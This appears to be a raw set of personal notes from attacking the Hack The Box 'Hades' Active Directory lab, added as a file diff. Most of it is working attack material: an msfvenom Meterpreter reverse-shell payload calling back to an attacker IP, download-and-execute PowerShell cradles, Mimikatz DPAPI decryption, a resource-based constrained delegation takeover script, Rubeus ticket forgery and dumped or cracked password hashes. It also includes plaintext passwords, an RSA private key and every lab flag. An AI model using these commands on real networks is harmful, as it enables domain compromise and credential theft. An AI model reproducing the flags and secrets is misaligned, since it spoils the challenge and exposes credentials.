+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+[*] Dumping cached domain logon information (domain/username:hash)
+[*] Dumping LSA Secrets
+[*] $MACHINE.ACC 
+$MACHINE.ACC:plain_password_hex:79004a003c003f0037003900710038004a00400075003e006c00580026007900510064004900490071003800660040006600680071004e0032005a0041002d0063006d0021003e003c00640075003c006a00540077003800390040005d00760030006a005900700052006700690032006f002c0043002d00790078003a006f00610078002800530066006400280065006e005b004a0044005100300079002f0045006f0067005300660033002f0044003800740061007900370039007a002e0020004500280079007a00400049002400320046005c006600500047006c003d002a005c003600200062004c005d003400
+$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:95e8a6fd440364b8c5d3c51bc4088e50
+[*] DPAPI_SYSTEM 
+dpapi_machinekey:0x14af28a044205b29fa287ffe035ce80102d09125
+dpapi_userkey:0x88e6521c1ff9c47e1f9a3404fd64f5753d55e5b2
+[*] NL$KM 
+ 0000   BC E0 99 9D 97 B6 E7 9D  3C B1 0F E7 4E 01 C8 DE   ........<...N...
+ 0010   07 E2 02 7F 6C 29 01 D0  78 33 49 F3 DA A8 F5 28   ....l)..x3I....(
+ 0020   DD 37 D3 B2 91 9B 7D 68  0B 09 E3 5C 52 AE 71 7C   .7....}h...\R.q|
+ 0030   40 A9 85 15 6B 48 37 EE  87 82 3E 6D B0 25 89 6B   @...kH7...>m.%.k
+NL$KM:bce0999d97b6e79d3cb10fe74e01c8de07e2027f6c2901d0783349f3daa8f528dd37d3b2919b7d680b09e35c52ae717c40a985156b4837ee87823e6db025896b
+[*] Cleaning up... 
+
+
+
+
+NL$KM
+it s used to decrypt domain cached creds
+
+
+
+
+
+
+
+
+msfvenom --smallest --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=10.14.15.228 LPORT=31337 -e x64/xor_dynamic -i 10 -b "\x00" -n 100 -f exe -o ~/Documents/HTB/Hades/xtc.exe
+
+Start-Process -Filepath "xtc.exe"
+
+meterpreter > hashdump
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:67bb396c79f56301b7dc5d219cc85d86:::
+DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+test_user:1021:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+enj:1018:aad3b435b51404eeaad3b435b51404ee:d4a90ea5500c2cbe5aae61efe5121c3f:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+puppa:1015:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+test:1022:aad3b435b51404eeaad3b435b51404ee:d6a6a7859dd8395bd2414d77ea4d91a0:::
+WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+whoami:1023:aad3b435b51404eeaad3b435b51404ee:ae1a528f179065f21749c59a656daa95:::
+
+
+DPAPImk2john.py
+
+$DPAPImk$2*1*S-1-5-21-4124311166-4116374192-336467615-500*aes256*sha512*8000*0691fd767b61a5e4a2cfc495da227744*288*b527ab4588e529b1830f8ca05a4bc2b78da4f2b82fbafc50becf29b184bfc36fcd104517a4c786db4af53c4d4684adf529b86b33f61c10813c69f34a8a966f58c462007940ab15cad8f53685be3a17d7745e2bb7fc421a2588d3a3af41bf744bb0227016b20a9d9706452165a0c942d7fdb753ab355227a367339f6096f63dbfa04fc95b07ef318f1423cc331aca7c1f
+  
+
+
+
+cat Inveigh-NTLMv2.txt
+��administrator::dev:645C9CD9B6420A29:DC7158C4BA36C01FFA4F8B9E8979DEDB:01010000000000006C76AB3DEE88D5014849576C584C5363000000000200060048005400420001000600440045005600040012006800740062002E006C006F00630061006C0003001A006400650076002E006800740062002E006C006F00630061006C00050012006800740062002E006C006F00630061006C00070008006C76AB3DEE88D5010900100063006900660073002F004400450056000000000000000000
+administrator:::0204C09899438D4F:A047B243C2DA5302DD6D394A7084A59E:0101000000000000657FD850EE88D50144464B684B6F6161000000000200060048005400420001000600440045005600040012006800740062002E006C006F00630061006C0003001A006400650076002E006800740062002E006C006F00630061006C00050012006800740062002E006C006F00630061006C0007000800657FD850EE88D5010900100063006900660073002F004400450056000000000000000000
+test-svc::htb:1ECCD8A9CEE13AD5:B3E058474286B7E5AD2D1FB3A0AAA284:0101000000000000770ACDADEE88D501365A4C624632786F00000000010006004400450056000200060048005400420003001A006400650076002E006800740062002E006C006F00630061006C00040012006800740062002E006C006F00630061006C00050012006800740062002E006C006F00630061006C0007000800770ACDADEE88D5010900100063006900660073002F004400450056000000000000000000
+  
+
+
+MIMIKATZ:
+
+
+dpapi::masterkey /in:"C:\Windows\Tasks\bla\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\87790867-a883-4a2d-a467-019c315e1104" /password:"./*40ra26AZ"
+
+dpapi::masterkey /in:"C:\Windows\Tasks\bla\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\dc6059f1-5ba2-4186-871a-0ff4055a6875" /password:"./*40ra26AZ"
+C:\Windows\TAsks\bla\users\administrator\AppData\roaming\microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500 /password:"./*40ra26AZ"
+
+
+
+
+dpapi::masterkey /in:"C:\Windows\Tasks\bla\Users\Administrator\AppData\Roaming\Microsoft\Protect\S-1-5-21-4124311166-4116374192-336467615-500\87790867-a883-4a2d-a467-019c315e1104" /password:"/*40ra26AZ"
+[masterkey] with password: /*40ra26AZ (normal user)
+ERROR kuhl_m_dpapi_masterkey ; kull_m_dpapi_unprotect_masterkey_with_password
+
+
+[masterkey] with volatile cache: SID:S-1-5-21-4124311166-4116374192-336467615-500;GUID:{26b08a5f-4b2c-420d-9843-d05ea57cd32f};MD4:de53e322ea95ac2723a2e3e149874aac;SHA1:7cb14ea6f0ed4e5ed9ac0a6a167f088eeec2e09b;
+
+[masterkey] with password: ./*40ra26AZ (normal user)
+  key : e0b92cbfbeab126231d979377ffd236b2ebd4b0704e2e9229d3ce82bebd144173b9f7160315d5af62289fae50a1fd465100aaf36748b68557e2b05edc2
+5ac4fe
+  sha1: dacd0e1ccaa03abd1ccb22ce058815624739a607
+
+
+FOUND FLAG
+
+meterpreter > kiwi_cmd dpapi::cred /in:"C:\Windows\Tasks\bla\Users\Administrator\AppData\Roaming\Microsoft\Credentials\1A2572C793495F694F64823A392D4718" /password:"./*40ra26AZ"
+ERROR kuhl_m_dpapi_cred ; Input CRED file needed (/in:file)
+
+unk1           : 00000000 - 0
+  TargetName     : Domain:target=flag
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : flag
+  CredentialBlob : HADES{V5C_r3ve4L_DPaP1_s3cret5}
+  Attributes     : 0
+
+dpapi::cred /in:"C:\Windows\Tasks\bla\Users\Administrator\AppData\Roaming\Microsoft\Credentials\4A2EEB30EFC7958491B6578D9948EC7F /password:"./*40ra26AZ"
+
+unk1           : 00000000 - 0
+  TargetName     : Domain:target=flag
+  UnkData        : (null)
+  Comment        : (null)
+  TargetAlias    : (null)
+  UserName       : test-svc
+  CredentialBlob : T3st-S3v!ce-F0r-Pr0d
+  Attributes     : 0
+
+
+192.168.56.1
+
+
+[*] 192.168.3.202:445     - 192.168.3.202:445 - Starting SMB login bruteforce
+[+] 192.168.3.202:445     - 192.168.3.202:445 - Success: 'HTB\test-svc:T3st-S3v!ce-F0r-Pr0d'
+[*] 192.168.3.202:445     - Scanned 1 of 1 hosts (100% complete)
+
+proxychains smbclient -U 'htb\\test-svc:T3st-S3v!ce-F0r-Pr0d' //192.168.56.1/test
+
+log in but nothing found.
+
+
+
+proxychains bloodhound-python -c all -u test-svc -p 'T3st-S3v!ce-F0r-Pr0d' -d htb.local -dc 192.168.3.203 --dns-tcp -ns 192.168.3.203
+
+
+
+
+
+
+customscript to do magic:
+Import-Module .\powermad.ps1
+Import-Module .\powerview-dev.ps1
+$SecPassword = ConvertTo-SecureString 'T3st-S3v!ce-F0r-Pr0d' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB\test-svc', $SecPassword)
+$TargetComputer = "web.htb.local"
+$AttackerSID = Get-DomainUser test-svc -Properties objectsid  -Credential $Cred | Select -Expand objectsid
+
+# verify the GenericWrite permissions on $TargetComputer
+$ACE = Get-DomainObjectACL $TargetComputer  -Credential $Cred | ?{$_.SecurityIdentifier -match $AttackerSID}
+$ACE
+
+ConvertFrom-SID $ACE.SecurityIdentifier
+
+# add a new machine account that we control
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)  -Credential $Cred
+
+# get the SID of the new computer we've added
+
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid  -Credential $Cred | Select -Expand objectsid
+
+# build the new raw security descriptor with this computer account as the principal
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+
+# get the binary bytes for the SDDL
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
+Get-DomainComputer $TargetComputer   -Credential $Cred | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}   -Credential $Cred 
+
+# confirming the security descriptor add
+$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'  -Credential $Cred | select -expand msds-allowedtoactonbehalfofotheridentity
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+$Descriptor.DiscretionaryAcl
+
+# currently don't have access to primary\C$
+#dir \\web.htb.local\C$
+
+# get the hashed forms of the plaintext
+.\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:htb.local
+
+# execute Rubeus' s4u process against $TargetComputer
+#   EF266C6B963C0BB683941032008AD47F == 'Summer2018!'
+#   impersonating "harmj0y" (a DA) to the cifs sname for the target computer (primary)
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:iis-svc /msdsspn:cifs/web.htb.local /ptt
+
+# cleanup - clear msds-allowedtoactonbehalfofotheridentity
+#Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
+
+
+
+NOTHING FOUND
+
+tried
+
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:'web$' /msdsspn:cifs/web.htb.local /ptt
+i replaced the user with web$
+
+.\r.exe s4u /user:D$ /domain:htb.local /rc4:D9A466BCBEE2045052942C32B218B2F4 /impersonateuser:WEB$ /msdsspn:WSMAN/WEB / altservice:cifs,host /ptt
+
+
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:iis-svc /msdsspn:http/web.htb.local /ptt
+
+
+nothing
+
+
+Maybe try smbclient or winrm on other servers with these creds
+
+proxychains smbclient -U 'htb\\test-svc:T3st-S3v!ce-F0r-Pr0d' //192.168.56.1/test
+
+proxychains ruby evil-winrm.rb -u test-svc -p 'T3st-S3v!ce-F0r-Pr0d' -i 192.168.3.203
+
+nothing trying from dev to web agian
+
+Import-Module .\powermad.ps1
+Import-Module .\powerview-dev.ps1
+$SecPassword = ConvertTo-SecureString 'T3st-S3v!ce-F0r-Pr0d' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('HTB\test-svc', $SecPassword)
+$TargetComputer = "web.htb.local"
+$AttackerSID = Get-DomainUser test-svc -Properties objectsid  -Credential $Cred | Select -Expand objectsid
+
+# verify the GenericWrite permissions on $TargetComputer
+$ACE = Get-DomainObjectACL $TargetComputer  -Credential $Cred | ?{$_.SecurityIdentifier -match $AttackerSID}
+$ACE
+
+ConvertFrom-SID $ACE.SecurityIdentifier
+
+# add a new machine account that we control
+New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)  -Credential $Cred
+
+# get the SID of the new computer we've added
+
+$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid  -Credential $Cred | Select -Expand objectsid
+
+# build the new raw security descriptor with this computer account as the principal
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+
+# get the binary bytes for the SDDL
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+# set new security descriptor for 'msds-allowedtoactonbehalfofotheridentity'
+Get-DomainComputer $TargetComputer   -Credential $Cred | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}   -Credential $Cred 
+
+# confirming the security descriptor add
+$RawBytes = Get-DomainComputer $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'  -Credential $Cred | select -expand msds-allowedtoactonbehalfofotheridentity
+$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
+$Descriptor.DiscretionaryAcl
+
+# currently don't have access to primary\C$
+#dir \\web.htb.local\C$
+
+# get the hashed forms of the plaintext
+.\Rubeus.exe hash /password:Summer2018! /user:attackersystem /domain:htb.local
+
+# execute Rubeus' s4u process against $TargetComputer
+#   EF266C6B963C0BB683941032008AD47F == 'Summer2018!'
+#   impersonating "harmj0y" (a DA) to the cifs sname for the target computer (primary)
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:iis-svc /msdsspn:cifs/web.htb.local /ptt
+
+# cleanup - clear msds-allowedtoactonbehalfofotheridentity
+#Get-DomainComputer $TargetComputer | Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
+
+
+proxychains bloodhound-python -c all -u test-svc -p 'T3st-S3v!ce-F0r-Pr0d' -d htb.local -dc 192.168.3.203 --dns-tcp -ns 192.168.3.203
+
+
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:'web$' /msdsspn:cifs/web.htb.local /ptt
+i replaced the user with web$
+
+.\r.exe s4u /user:D$ /domain:htb.local /rc4:D9A466BCBEE2045052942C32B218B2F4 /impersonateuser:WEB$ /msdsspn:WSMAN/WEB / altservice:cifs,host /ptt
+
+
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:iis-svc /msdsspn:http/web.htb.local /ptt
+
+
+root@kali:~/Documents/HTB/Hades# proxychains smbclient -L \\\\192.168.56.1\\test -U 'htb\\test-svc'
+ProxyChains-3.1 (http://proxychains.sf.net)
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.56.1:445-<><>-OK
+Enter test-svc's password:
+
+Sharename       Type      Comment
+---------       ----      -------
+ADMIN$          Disk      Remote Admin
+C$              Disk      Default share
+IPC$            IPC       Remote IPC
+test            Disk      
+
+T3st-S3v!ce-F0r-Pr0d
+
+
+test.txt had string of "test" in side. tried to upload and launch malicious exe nothing.
+
+
+.\Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:iis-svc /msdsspn:http/web.htb.local /ptt 
+
+back to iis-svc  impersonate and acl abuse. Only spn that worked is http. 
+
+
+tried to winrm gateway with test-svc failed.
+proxychains ruby evil-winrm.rb -i 192.168.56.1 -U /WSMAN -u test-svc -p 'T3st-S3v!ce-F0r-Pr0d'
+
+Think the wayis this
+
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
+
+
+IEX(New-Object Net.Webclient).downloadstring('IP');pwn.ps1 -Machine NAME_HERE
+
+pwn.ps1
+Import-Module .\pv.ps1
+Import-Module .\pm.ps1
+function pwn ($Machine){
+$SecPassword = ConvertTo-SecureString 'T3st-S3v!ce-F0r-Pr0d' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\test-svc', $SecPassword)
+New-MachineAccount -MachineAccount $Machine -Password $(ConvertTo-SecureString 'Password#123' -AsPlainText -Force) -Verbose
+$ComputerSid = Get-DomainComputer $Machine -Properties objectsid  -Credential $Cred | Select -Expand objectsid
+Write-Output "[+] SID: $ComputerSid"
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer web -Credential $Cred | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}   -Credential $Cred
+Write-Output "[+] Done!"
+}
+And then you can use rubeus using the ntlm of
+Password#123
+
+
+https://github.com/GhostPack/Rubeus 
+
+
+https://github.com/S3cur3Th1sSh1t/Creds/blob/bcfa421fe0dbf1c4407995c081b487c3814e25af/PowershellScripts/Powermad.ps1
+
+https://github.com/S3cur3Th1sSh1t/Creds/blob/bcfa421fe0dbf1c4407995c081b487c3814e25af/PowershellScripts/PowerView.ps1
+
+
+(New-Object Net.Webclient).downloadstring('http://10.14.15.228/Rubeus.exe','r.exe')
+(New-Object Net.Webclient).downloadstring('http://10.14.15.228/pm.ps1','pm.ps1')
+(New-Object Net.Webclient).downloadstring('http://10.14.15.228/pv.ps1','pv.ps1')
+IEX(New-Object Net.Webclient).downloadstring('http://10.14.15.228/pwn.ps1','pwn.ps1');pwn.ps1 -Machine WEB
+
+
+
+<div class="details__field-value">remote_user</div>
+</div><div class="details__field details__field--editable details__field--protect details__field--edit details__field--protected">
+<div class="details__field-label" draggable="false">Password</div>
+<div class="details__field-value"><input value="FZg28$dJe*Hx7c" autocomplete="off" spellcheck="false"><div class="details__field-value-btn details__field-value-btn-gen"></div></div>
+
+
+
+post/windows/gather/cachedump
+[*] Executing module against WEB
+[*] Cached Credentials Setting:  - (Max is 50 and 0 disables, and 10 is default)
+[*] Obtaining boot key...
+[*] Obtaining Lsa key...
+[*] Vista or above system
+[*] Obtaining NL$KM...
+[*] Dumping cached credentials...
+[*] Hash are in MSCACHE_VISTA format. (mscash2)
+[+] MSCACHE v2 saved in: /root/.msf4/loot/20191025170532_default_10.13.38.16_mscache2.creds_815483.txt
+[*] John the Ripper format:
+# mscash2
+remote_user:$DCC2$10240#remote_user#021f10dc08753a885186720dc02631c3::
+
+
+
+cache dump msf 202
+
+mscash2
+remote_user:$DCC2$10240#remote_user#021f10dc08753a885186720dc02631c3::
+
+
+
+cracked remote user hash from before 
+proxychains ruby evil-winrm.rb -i 192.168.3.202 -u remote_user -p 'FZg28$dJe*Hx7c'
+
+found a flag
+
+Evil-WinRM* PS C:\Users\remote_user.HTB\desktop> ls
+
+
+    Directory: C:\Users\remote_user.HTB\desktop
+
+
+Mode                LastWriteTime     Length Name                                                                                                                                                                                                        
+----                -------------     ------ ----                                                                                                                                                                                                        
+-ar--          9/5/2019   3:40 PM         34 flag.txt                                                                                                                                                                                                    
+
+
+*Evil-WinRM* PS C:\Users\remote_user.HTB\desktop> cat flag.txt
+HADES{From_RBCD_To_p4s5word_v@Ult}
+
+
+
+figure admin on web is next
+
+
+to get it created one of the cached domains found and intercepted traffic. 
+
+  0001  db2.htb.local
+   0001  dc1.htb.local
+   0001  db1.htb.local
+   0001  db3.htb.local
+   00ff  _ldap._tcp.default-first-site-name._sites.dc1.htb.local
+   00ff  isatap
+   00ff  wpad
+   00ff  _ldap._tcp.dc1.htb.local
+
+
+https://blog.netspi.com/exploiting-adidns/
+
+
+.\tshark.exe -ni 1 -ni 2 -ni 7 -ni 8 -b filesize:500000 -w C:\Users\remote_user\Documents\new.pcap
+
+responder work.
+
+
+intercepted hash and cracked
+
+
+hashcat64.exe -m 5600 hashes\WEB_admin_ntlmv2.txt.txt SecLists\Passwords\Common-Credentials\10-million-password-list-top-1000000.txt -r rules\d3ad0ne.rule -w 3
+ADMINISTRATOR:::72f53a5e5183525b:e03876b0bbe69e34bc4f9b9194eeea87:0101000000000000c0653150de09d201c32cdd1a5d2ffe12000000000200080053004d004200330001001e00570049004e002d00500052004800340039003200520051004100460056000400140053004d00420033002e006c006f00630061006c0003003400570049004e002d00500052004800340039003200520051004100460056002e0053004d00420033002e006c006f00630061006c000500140053004d00420033002e006c006f00630061006c0007000800c0653150de09d2010600040002000000080030003000000000000000000000000030000060cabee556ff572205ae429bf7b43dc22ab3ae4785f7a9f74d5b1020a221247b0a001000000000000000000000000000000000000900240063006900660073002f006400620032002e006800740062002e006c006f00630061006c00000000000000000000000000:Myp@ssw0rd
+
+
+root@kali:~/Documents/HTB/Hades# proxychains ruby evil-winrm.rb -U /wsman -u administrator -p 'Myp@ssw0rd' -i 192.168.3.202
+ProxyChains-3.1 (http://proxychains.sf.net)
+
+Evil-WinRM shell v1.8
+
+Info: Establishing connection to remote endpoint
+
+|S-chain|-<>-127.0.0.1:1080-<><>-192.168.3.202:5985-<><>-OK
+*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ..
+*Evil-WinRM* PS C:\Users\Administrator> cd desktop
+cat *Evil-WinRM* PS C:\Users\Administrator\desktop> cat flag.txt
+HADES{Why_llmnr_wh3n_y0u_got_adidns}
+
+C:\Users\Administrator\AppData\Roaming\KeePass
+There are different config file, I found it using 
+dir /a /s *keepass*
+
+Secret  : DefaultPassword
+cur/text: Myp@ssw0rd
+old/text: A!rF0rce1
+HTSa!@#12edsr%
+
+
+
+
+
+the website was about keepass
+meterpreter > cat manifest.json
+{
+    "name": "KeeWeb",
+    "short_name": "KeeWeb",
+    "description": "Free cross-platform password manager compatible with KeePass",
+    "display": "standalone",
+    "orientation": "any",
+    "theme_color": "#6386ec",
+    "background_color": "#6386ec",
+    "icons": [
+        {
+            "src": "icons/android-chrome-192x192.png",
+            "sizes": "192x192",
+            "type": "image/png"
+        },
+        {
+            "src": "icons/android-chrome-512x512.png",
+            "sizes": "512x512",
+            "type": "image/png"
+        }
+    ]
+}
+
+
+
+kee pass crack for docker creds:
+$1$k/A8egUe$8epNXOO3.0tMoMJvJXRya1:tcuser
+
+docker:tcuser
+
+
+{                         
+    "ConfigVersion": 3,          
+    "Driver": {         
+        "IPAddress": "192.168.99.100",
+        "MachineName": "default",
+        "SSHUser": "docker",
+        "SSHPort": 49248,          
+        "SSHKeyPath": "C:\\Users\\Administrator\\.docker\\machine\\machines\\default\\id_rsa",
+        "StorePath": "C:\\Users\\Administrator\\.docker\\machine",
+        "SwarmMaster": false,   
+        "SwarmHost": "tcp://0.0.0.0:3376",
+        "SwarmDiscovery": "", 
+        "VBoxManager": {},
+        "HostInterfaces": {},
+        "CPU": 1,
+        "Memory": 1024,
+        "DiskSize": 20000,
+        "NatNicType": "82540EM",
+        "Boot2DockerURL": "",
+        "Boot2DockerImportVM": "",
+        "HostDNSResolver": false,
+        "HostOnlyCIDR": "192.168.99.1/24",
+        "HostOnlyNicType": "82540EM",
+        "HostOnlyPromiscMode": "deny",
+        "UIType": "headless",
+        "HostOnlyNoDHCP": false,
+        "NoShare": false,
+        "DNSProxy": true,
+        "NoVTXCheck": true,
+        "ShareFolder": ""
+    },
+PS > cat id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAwiHc7jhJb9yi1zaH7cUUjRUqrLM6n1o2ZKDRpyfVJ5seS/oz
+dMJ0/uAgEuqboxZIixXoYmVMPon0Wrx+nmecCzUUCp3pI7Wihu18JozrEL6xSiUX
+1LNE36+n5N5KjZ6oUUATZyxYh8IPexisSKYIJPKa98JKxZkrnTaRgDXlpXRHP+Ax
+cY+WT/LR2XktCyOgFSQll/JIKLzbfbRGkcJgQRI03xy6KuvHJbQXK1eYBpf8nbzK
+jEt6luwj0GqQ9BHCPrVm8NTCA2QxHZqxs/KmeHq5jVYd6CPzM9+r1VBcXLjWA0rc
+/WYDeLmAECCaSTFnC0nNvvK5NoMa0h6Kad3kDwIDAQABAoIBAHclz3IJ69CTCwKp
+fk3JWq6oYhOywPUSqjWimmpMQT/YrYSWIES2IJZZunXBthonUAjFPmY9o8jyZJ3X
++KKCFryuLAnEF1YKYaEMWtlSPed+ElPeZjzudgQPzCzk3b8DtGyBtibpicBws42q
+e/rupCsBF2mevsN+Gc2Ysz6MVdDwdW14Yvp/6Vq7u3KMrEj+LyN9cyzrurDhTByb
+UI/XWklSUPIBN6cuqSULW4GkK1GOQMjnkDd5prizxA4+lHT1YY956joHKEBcp/bq
+j4iGLe0eKiOtQ5HFjAROowaiFmyeYnHPztFGMmC0Q+EBQl8ZM9q0Cpo4AZGAros8
+d2+kupkCgYEAzunLL3tRp4a+c8ViLcDkhcV9JVJw4TIPDMmemB9gw70xgJCZyMwB
+6KrEiT/qk/KfL58JxT7DCAG3eM2mlL0dmrfEwzcPugPtsAXZg65tFn+PO7UgupS8
+z6LZbXj07a3ygkty0v60UInAdbdTq08ZyOMGlJOEiMSZ0TJJPB+GcpUCgYEA8C/b
+opI7CA4rgCVcxCCqA1s9BxEC9FWx5LzvXa+6u6CCBIeGGHCjASMLgPsG/9QJYnBs
+tguXUFiJOoFR6NTOukzXdqInpCxqhI7MsLkHRlbfUIr93MRVitnPrA7RSKTUBEZl
+D120HQL0DAM9zkr4CZDDJE4bV/plktef4LY4FxMCgYEAlDbynfuHHSqvCDzuu/l9
+eLljkLWCOD3ke/N80FlBtlSyvfZWwngoMeMJT4tiXEIidzlEBW+Uwwp/w2AEoGzr
+ZOWYY4HwmP2xaDJ4ghQS/le3YTy4yg47RbzQZNONFyhQG7cx9CQRQ9O48lm07HSH
+8td04j7dZB74U9rijNfENhUCgYEAhfabcQRQioCkwJeWMwno6XBVDIDvfeniC6tZ
+co6V/xpaCj6wiycfs32hZ/IbCEtyZIZCDBNQ9Q48k/YXAl7XYs+DCXcN1yKy0nZ3
+MkYxCYlgiqLLTvvunkA39UZackMEwdGlgjmIQPopth2Etm/YAjXMsY4i8CIHzywW
+zxWzGSMCgYAjaZia7gj/+xSQhcH/Rq0J4qErbDHD/m15ki+/IqLYfvwYIsd/wYdN
+DcJLPzy3n5fU3JtfJsEJapvTY8vygqABHz5EeCQf+yrNDv5/Q4lAhXhOB87AcXfL
+0GwZ3NA+Jc/F/Fe2qLYNSCuNC/y1c3qIt5QBNvPYXW3H9+cVNgPwNA==
+-----END RSA PRIVATE KEY-----
+so docker user on 192.168.99.100, port 49248
+
+
+
+ssh -i id_rsa docker@192.168.99.100
+proxychains ssh -i /root/hades_key docker@192.168.99.100
+
+
+I think the 2nd flag originally was docker privesc, which some people found
+They had this flag in /root/flag.txt in initial docker some time before release
+HADES{ComPr0m1s3d_C0nt4in3rs}
+Maybe they decided to remove it because the docker was going to be used for pivoting
+
+/mnt/sda1/var/lib/docker/overlay2/5aa3d2a2a5c210ad776d393c5830f7bba554ac1e85f86302648e160a735cc062/diff/root/flag.txt
+/mnt/sda1/var/lib/docker/overlay2/ddc2426bfa1c506ad433965561c944434de3eaf461f23fd1e5cca2cd2168fd1d/diff/root/flag.txt
+HADES{ComPr0m1s3d_C0nt4in3rs}
+
+Domain admin is the way for final flag. 
+
+admin we have is in protected users used rdp to get around it
+
+
+back to meterpreter shell
+
+Start-Process -Filepath "xtc.exe"
+
+enable rdp with 
+
+
+meterpreter > run getgui -e
+
+[!] Meterpreter scripts are deprecated. Try post/windows/manage/enable_rdp.
+[!] Example: run post/windows/manage/enable_rdp OPTION=value [...]
+[*] Windows Remote Desktop Configuration Meterpreter Script by Darkoperator
+[*] Carlos Perez carlos_perez@darkoperator.com
+[*] Enabling Remote Desktop
+[*] 	RDP is disabled; enabling it ...
+[*] Setting Terminal Services service startup mode
+[*] 	The Terminal Services service is not set to auto, changing it to auto ...
+[*] The following Error was encountered: Rex::TimeoutError Operation timed out.
+[*] For cleanup use command: run multi_console_command -r /root/.msf4/logs/scripts/getgui/clean_up__20191029.4757.rc
+
+
+
+to rdp as web\Administrator  then used runas to get kerberos tgt
+
+proxychains xfreerdp /u:administrator /p:'Myp@ssw0rd' /v:192.168.3.202:3389
+
+sucked disabled firewall and used external address
+
+xfreerdp /u:administrator /p:'Myp@ssw0rd' /v:10.13.38.16:3389
+
+runas /netonly /user:htb\administrator cmd
+
+
+
+PS C:\Windows\system32> $cred  = New-Object Management.Automation.PSCredential ("Administrator",$(convertto-securestring "Myp@ssw0rd" -asplaintext -force)); Invoke-Command -Credential $cred -Computername dc1.htb.local -ScriptBlock { type C:\Users\Administrator.HTB\Desktop\flag.txt }
+
+HADES{Tam1ng_Kerber0s_Wi1l_gRant_4cCess_t0_H4des}
+
+
+Got final flag!
+
+
+HADES
+HADES{Fr4gil3_b1aCkli5tiNg} CHASM FLAG
+HADES{DoNt_d1s4ble_K3rbeRos_Pre_aUth3nticat1on} GUARDIAN
+HADES{Sp0ol_SeRv1ce_sO_Brok3n} MESSENGER
+HADES{V5C_r3ve4L_DPaP1_s3cret5} resurrection
+HADES{From_RBCD_To_p4s5word_v@Ult} gateway
+HADES{Why_llmnr_wh3n_y0u_got_adidns} CELESTIAL
+HADES{Tam1ng_Kerber0s_Wi1l_gRant_4cCess_t0_H4des} DOMINION
